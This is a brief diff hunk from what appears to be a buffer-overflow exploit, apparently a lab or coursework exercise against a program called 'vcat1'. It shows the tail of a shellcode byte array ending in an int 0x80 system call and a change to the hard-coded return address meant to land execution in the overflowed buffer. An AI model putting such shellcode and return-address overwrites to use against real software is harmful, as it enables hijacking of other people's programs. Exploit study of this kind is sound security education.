@@ -108,7 +108,7 @@ unsigned char payload[] =
 	"\xcd\x80"	/* int    $0x80		*/
 	/* ------------------------------------	*/
 	// Put the address of the buffer here (we think)
-	"\x3f\x5f\xe8\xb5"
+	"\xf0\xb5\xff\xbf"
 	// esp after returing is 0xBFFFB700
 
 	// 0xb5e85f3d is start of text section in memory for vcat1
